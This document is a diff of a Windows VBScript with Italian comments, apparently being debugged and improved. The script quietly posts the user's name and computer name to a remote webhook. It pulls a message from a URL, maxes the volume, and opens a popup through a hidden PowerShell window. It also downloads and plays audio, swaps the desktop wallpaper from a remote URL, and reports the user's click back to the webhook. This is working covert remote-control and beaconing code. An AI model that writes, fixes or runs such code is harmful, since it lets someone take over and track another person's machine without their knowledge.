@@ -3,13 +3,13 @@ On Error Resume Next
 
 ' --- CONFIGURAZIONE --- 
 Dim shell, fso, xmlHttp, i, exec 
-Dim urlImmagine1, urlImmagine2,urlImmagine3, urlAudio1, urlAudio2, urlAudio3 
+Dim urlImmagine1, urlImmagine2, urlImmagine3, urlAudio1, urlAudio2, urlAudio3 
 Dim urlMessaggio, webhookURL 
 Dim messaggioDalWeb, nomeUtente, nomePC 
 Dim scelta1, scelta2, scelta3, sceltaEffettuata 
 
-scelta1 = "" 
-scelta2 = "OK" 
+scelta1 = "OK" 
+scelta2 = "" 
 scelta3 = "" 
 
 Dim ts: ts = Timer()
@@ -28,20 +28,24 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%") 
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") 
 
-' --- NOTIFICA AVVIO (Dati puliti) ---
+' --- NOTIFICA AVVIO ---
 InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO", "In attesa"
 
 ' --- DOWNLOAD MESSAGGIO --- 
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
 xmlHttp.Open "GET", urlMessaggio, False 
 xmlHttp.Send 
-If xmlHttp.Status = 200 Then messaggioDalWeb = Trim(xmlHttp.responseText) 
+If xmlHttp.Status = 200 Then 
+    messaggioDalWeb = Trim(xmlHttp.responseText)
+    ' --- SOLUZIONE: Sanificazione Apici per PowerShell ---
+    messaggioDalWeb = Replace(messaggioDalWeb, "'", "''")
+End If 
 
 ' --- VOLUME --- 
 shell.SendKeys Chr(&hAD)  
 For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 
 
-' --- POPUP ORIGINALE --- 
+' --- POPUP (Versione Robusta) --- 
 If messaggioDalWeb <> "" Then 
     Dim psPopup 
     psPopup = "Add-Type -AssemblyName System.Windows.Forms; " & _ 
@@ -50,11 +54,11 @@ If messaggioDalWeb <> "" Then
                "$l = New-Object Windows.Forms.Label; $l.Text = '" & messaggioDalWeb & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
                "$l.Dock = 'Fill'; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
                "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 60; " & _ 
-               "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; $p.Padding = New-Object Windows.Forms.Padding(0,10,0,0); " 
+               "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; "
       
     If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & scelta1 & "'; $b1.AutoSize = $true; $b1.Add_Click({$global:res='" & scelta1 & "';$f.Close()}); $p.Controls.Add($b1); " 
     If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & scelta2 & "'; $b2.AutoSize = $true; $b2.Add_Click({$global:res='" & scelta2 & "';$f.Close()}); $p.Controls.Add($b2); " 
-    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & scelta3 & "'; $b3.Add_Click({$global:res='" & scelta3 & "';$f.Close()}); $p.Controls.Add($b3); " 
+    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & scelta3 & "'; $b3.AutoSize = $true; $b3.Add_Click({$global:res='" & scelta3 & "';$f.Close()}); $p.Controls.Add($b3); " 
       
     psPopup = psPopup & "$f.Add_Shown({ " & _ 
                "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
@@ -62,7 +66,8 @@ If messaggioDalWeb <> "" Then
                "}); " 
     psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; Write-Output $global:res" 
       
-    Set exec = shell.Exec("powershell -WindowStyle Hidden -Command """ & psPopup & """") 
+    ' Uso di Chr(34) per gestire correttamente le virgolette esterne
+    Set exec = shell.Exec("powershell -WindowStyle Hidden -NoProfile -Command " & Chr(34) & psPopup & Chr(34)) 
     sceltaEffettuata = Replace(Replace(Replace(exec.StdOut.ReadAll(), vbCrLf, ""), vbCr, ""), vbLf, "") 
 End If 
 
@@ -76,17 +81,14 @@ End Select
 ' --- NOTIFICA FINALE --- 
 InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, messaggioDalWeb, sceltaEffettuata 
 
-' --- FUNZIONI --- 
-
+' --- FUNZIONI --- (Invariate, ma incluse per completezza)
 Sub RiproduciAudio(urlAudio) 
-    On Error Resume Next 
     Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
     shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 
     If fso.FileExists(p) Then shell.Run "wmplayer.exe """ & p & """ /Play", 7, False 
 End Sub 
 
 Sub CambiaFondoDesktop(urlImmagine) 
-    On Error Resume Next 
     Dim imgPath: imgPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\bg_current.jpg" 
     shell.Run "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & urlImmagine & "', '" & imgPath & "')""", 0, True 
     WScript.Sleep 2000 
@@ -101,11 +103,8 @@ Sub CambiaFondoDesktop(urlImmagine)
 End Sub 
 
 Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta) 
-    On Error Resume Next 
-    ' Creazione payload con variabili racchiuse tra virgolette singole per PowerShell
     Dim body: body = "@{ 'utente' = '" & utente & "'; 'pc' = '" & pc & "'; 'scelta' = '" & scelta & "'; 'testo' = '" & messaggio & "' } | ConvertTo-Json"
     Dim cmd: cmd = "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
                    "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body (" & body & ") -ContentType 'application/json'"""
     shell.Run cmd, 0, True 
 End Sub
-
